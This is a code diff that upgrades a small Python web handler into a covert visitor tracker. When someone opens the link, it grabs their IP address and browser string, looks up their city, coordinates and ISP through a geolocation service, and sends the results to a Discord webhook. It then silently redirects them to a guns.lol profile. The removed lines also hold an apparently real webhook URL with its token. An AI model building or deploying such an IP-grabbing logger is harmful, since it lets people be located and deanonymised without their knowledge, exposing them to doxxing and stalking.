@@ -3,36 +3,44 @@ import requests
 import json
 
 # Replace with your actual Discord Webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1471709365064171624/1Do6JPAWJ-EQ5RipNP9bIGrX2lcTv0rdNs7O-Mi2iTYsS96UTiW9fL40Rd0CHpdpvitW"
-# Replace with your guns.lol profile URL
+WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
+# Your profile link
 REDIRECT_URL = "https://guns.lol/sleezyyyyyy"
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        # 1. Collect Visitor Data
-        ip_address = self.headers.get('x-forwarded-for', self.client_address[0])
-        user_agent = self.headers.get('user-agent', 'Unknown')
+        # 1. Get the IP
+        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
         
-        # 2. Prepare the Discord Message
+        # 2. Get the Location/Coordinate Data
+        try:
+            geo = requests.get(f"http://ip-api.com/json/{ip}").json()
+            city = geo.get('city', 'Unknown')
+            region = geo.get('regionName', 'Unknown')
+            country = geo.get('country', 'Unknown')
+            coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
+            isp = geo.get('isp', 'Unknown')
+        except:
+            city = region = country = coords = isp = "Error Fetching"
+
+        # 3. Build the fancy Discord Message
         data = {
             "embeds": [{
-                "title": "🎯 New Visitor Logged",
-                "color": 16711680, # Red
+                "title": "🎯 New Visitor Located!",
+                "color": 16711680,
                 "fields": [
-                    {"name": "IP Address", "value": f"`{ip_address}`", "inline": True},
-                    {"name": "Device/Browser", "value": user_agent, "inline": False}
+                    {"name": "🌐 IP Address", "value": ip, "inline": True},
+                    {"name": "📍 Location", "value": f"{city}, {region}, {country}", "inline": True},
+                    {"name": "🗺️ Coordinates", "value": coords, "inline": False},
+                    {"name": "🏢 Provider/ISP", "value": isp, "inline": False},
+                    {"name": "📱 Device", "value": self.headers.get('User-Agent', 'Unknown'), "inline": False}
                 ],
                 "footer": {"text": "Guns.lol Redirect Logger"}
             }]
         }
 
-        # 3. Send to Discord
-        try:
-            requests.post(WEBHOOK_URL, json=data)
-        except Exception as e:
-            print(f"Webhook failed: {e}")
-
-        # 4. Perform the Redirect
+        # 4. Send to Discord & Redirect
+        requests.post(WEBHOOK_URL, json=data)
         self.send_response(302)
         self.send_header('Location', REDIRECT_URL)
         self.end_headers()
